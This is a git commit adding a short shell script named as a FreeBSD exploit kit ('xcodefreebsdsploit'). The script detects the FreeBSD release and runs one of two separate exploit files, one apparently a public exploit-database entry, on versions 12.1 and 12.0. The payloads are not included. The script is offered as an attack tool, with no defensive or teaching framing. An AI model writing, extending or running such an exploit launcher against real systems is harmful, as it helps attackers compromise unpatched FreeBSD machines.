0ddfbb3fc9586becf9327941bda169c80db6970e
Master Kurniawan <38490299+kurniawandata@users.noreply.github.com>
2024-03-21 06:44:35 +0700

    Add files via upload

---
+++ bsd.sh
@@ -0,0 +1,20 @@
+#!/bin/sh
+#xcodefreebsdsploit v0.1 beta 1
+os=$(uname -s)
+
+case "$os" in
+    FreeBSD)
+        freebsd_version=$(uname -r)
+        case "$freebsd_version" in
+            12.1-RELEASE)
+                ./exploit
+                ;;
+            12.0-RELEASE)
+                ./47081.sh
+                ;;
+            *)
+                echo "Versi FreeBSD tidak didukung."
+                ;;
+        esac
+        ;;
+esac
